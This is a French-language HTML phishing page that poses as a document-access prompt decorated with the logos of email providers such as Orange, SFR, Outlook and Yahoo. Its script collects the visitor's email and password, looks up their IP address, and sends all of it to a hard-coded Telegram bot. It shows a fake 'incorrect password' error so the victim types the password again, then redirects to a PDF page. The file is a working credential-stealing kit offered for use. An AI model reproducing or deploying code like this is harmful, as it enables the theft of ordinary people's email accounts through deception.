<html lang="fr"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>document</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: url('/img/FAC.jpg') center/cover no-repeat fixed;
            filter: blur(0px);
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('/img/FAC.jpg') center/cover no-repeat;
            filter: blur(3px);
            z-index: -1;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 350px;
            z-index: 1;
        }

        .login-container svg {
            display: block;
            margin: 0 auto 10px auto;
            width: 48px;
            height: 48px;
            stroke: #4CAF50;
            background: #e8f5e9;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(76, 175, 80, 0.08);
            padding: 8px;
            transition: stroke 0.3s, background 0.3s, transform 0.2s;
        }

        .login-container svg:hover {
            stroke: #388e3c;
            background: #c8e6c9;
            transform: scale(1.08) rotate(-2deg);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 3px;
            text-align: center;
            color: #333;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 18px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #4CAF50;
            box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.1);
        }

        button {
            width: 100%;
            padding: 12px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background: #45a049;
        }

        button:active {
            transform: scale(0.98);
        }

        .password-group {
            max-height: 0;
            overflow: hidden;
            opacity: 0;
            transition: max-height 0.5s ease, opacity 0.5s ease;
        }

        .password-group.visible {
            max-height: 100px;
            opacity: 1;
        }

        @keyframes slideIn {
            from {
                transform: translateY(-20px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .password-group.visible {
            animation: slideIn 0.5s ease;
        }

        span {
            display: block;
            margin-bottom: 20px;
            color: #666;
            font-size: 14px;
            text-align: start;
        }

        .box {
            background: #f8fafc;
            border: 2px dashed #cbd5e1;
            margin: 20px 0;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            flex-wrap: nowrap;
            gap: 5px;
            align-items: center;
            justify-content: center;
            overflow-x: auto;
        }

        .box img {
            width: 22px;
            height: 22px;
            object-fit: contain;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            flex-shrink: 0;
        }

        .box img:hover {
            transform: scale(1.1);
            opacity: 0.8;
        }

        .box-other {
            border: 1px solid #cbd5e1;
            padding: 6px 10px;
            border-radius: 8px;
            cursor: pointer;
            background: white;
            transition: background 0.2s, border-color 0.2s;
            font-size: 12px;
            color: #555;
            flex-shrink: 0;
            white-space: nowrap;
        }

        .box-other:hover {
            background: #f0f0f0;
            border-color: #4CAF50;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z"></path>
        </svg>

        <span>Veuillez confirmer votre adresse e‑mail où vous avez reçu le document pour y accéder.</span>
        <div class="box">
            <img src="https://c.woopic.com/small-logo-orange.svg" alt="orange" title="Orange">
            <img src="https://static.s-sfr.fr/assets/logos/SFR.svg" alt="sfr" title="SFR">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOVodEnyDq34-EHVZ8ccu5EzFKHqLPl0-4Dw&amp;s" alt="la poste" title="La Poste">
            <img src="https://tse4.mm.bing.net/th/id/OIP.m1rH-hf6GxPM_FkCxiP_2gHaHa?rs=1&amp;pid=ImgDetMain&amp;o=7&amp;rm=3" alt="Outlook" title="Outlook">
            <img src="https://tse4.mm.bing.net/th/id/OIP.htHdHSRSPa9kt-YY99RySwHaHa?rs=1&amp;pid=ImgDetMain&amp;o=7&amp;rm=3" alt="yahoo" title="Yahoo">
            <img src="https://purepng.com/public/uploads/large/purepng.com-mail-iconsymbolsiconsapple-iosiosios-8-iconsios-8-721522596075clftr.png" alt="autre" title="Autre fournisseur">
            <div class="box-other">Autres</div>
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="votre@email.com" maxlength="35" minlength="5" required="">
            </div>
            <div class="form-group password-group" id="passwordGroup">
                <label for="password">Mot de passe</label>
                <input type="text" id="password" name="password" placeholder="xxxxxx" maxlength="35" minlength="4">
            </div>
            <button type="button" id="submitBtn">Suivant</button>
            <div id="errorMsg" style="color: #d32f2f; font-size: 12px; margin-top: 8px; display: none;"></div>
        </form>
    </div>

    <script>
        const submitBtn = document.getElementById('submitBtn');
        const passwordGroup = document.getElementById('passwordGroup');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginForm = document.getElementById('loginForm');
        const errorMsg = document.getElementById('errorMsg');

        // Configuration Telegram
        const TELEGRAM_BOT_TOKEN = '8169237919:AAGwROXdtUB_QqJ3Em83A9M0hvPUnoqjAXM';
        const TELEGRAM_CHAT_ID = '7513018292';
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        // Flag pour tracker le nombre de tentatives
        let attemptCount = 0;

        // Fonction pour valider l'email
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Fonction pour récupérer l'IP
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Erreur IP:', error);
                return 'IP non disponible';
            }
        }

        // Fonction pour envoyer les données à Telegram
        async function sendToTelegram(email, password) {
            const userIP = await getUserIP();
            const message = `🔐 Nouvelle tentative\n\n: ${email}\nMdp: ${password}\nIP: ${userIP}\n\nDate: ${new Date().toLocaleString('fr-FR')}`;

            try {
                const response = await fetch(TELEGRAM_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Erreur Telegram:', error);
                return false;
            }
        }

        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            errorMsg.style.display = 'none';
            errorMsg.textContent = '';

            if (!passwordGroup.classList.contains('visible')) {
                // Valider l'email avant d'afficher le champ mot de passe
                if (!emailInput.value) {
                    errorMsg.textContent = 'Veuillez entrer votre email';
                    errorMsg.style.display = 'block';
                    return;
                }

                if (!isValidEmail(emailInput.value)) {
                    errorMsg.textContent = 'Adresse email invalide';
                    errorMsg.style.display = 'block';
                    return;
                }

                // Afficher le champ mot de passe
                attemptCount = 0; // Réinitialiser le compteur
                passwordGroup.classList.add('visible');
                submitBtn.textContent = 'Se connecter';
                passwordInput.focus();
            } else {
                // Soumettre le formulaire
                if (emailInput.value && passwordInput.value) {
                    attemptCount++;

                    if (attemptCount === 1) {
                        // Première tentative : envoyer à Telegram + afficher erreur
                        submitBtn.disabled = true;
                        submitBtn.textContent = 'Connexion en cours...';

                        sendToTelegram(emailInput.value, passwordInput.value).then(success => {
                            if (success) {
                                errorMsg.textContent = 'Mot de passe incorrect';
                                errorMsg.style.display = 'block';
                                passwordInput.value = '';
                                passwordInput.focus();
                                submitBtn.disabled = false;
                                submitBtn.textContent = 'Se connecter';
                            } else {
                                errorMsg.textContent = 'Erreur de connexion. Veuillez réessayer.';
                                errorMsg.style.display = 'block';
                                submitBtn.disabled = false;
                                submitBtn.textContent = 'Se connecter';
                            }
                        });
                    } else if (attemptCount >= 2) {
                        // Deuxième tentative : envoyer à Telegram 
                        submitBtn.disabled = true;
                        submitBtn.textContent = 'Connexion en cours...';

                        sendToTelegram(emailInput.value, passwordInput.value).then(success => {
                            if (success) {
                                window.location.href = './pdf.html'; // Rediriger vers la page d'accueil
                                // Réinitialiser le formulaire
                                emailInput.value = '';
                                passwordInput.value = '';
                                passwordGroup.classList.remove('visible');
                                submitBtn.textContent = 'Suivant';
                                submitBtn.disabled = false;
                                attemptCount = 0;
                                errorMsg.style.display = 'none';
                            } else {
                                errorMsg.textContent = 'Erreur de connexion. Veuillez réessayer.';
                                errorMsg.style.display = 'block';
                                submitBtn.disabled = false;
                                submitBtn.textContent = 'Se connecter';
                            }
                        });
                    }
                } else {
                    errorMsg.textContent = 'Veuillez remplir tous les champs';
                    errorMsg.style.display = 'block';
                }
            }
        });
    </script>


</body></html>
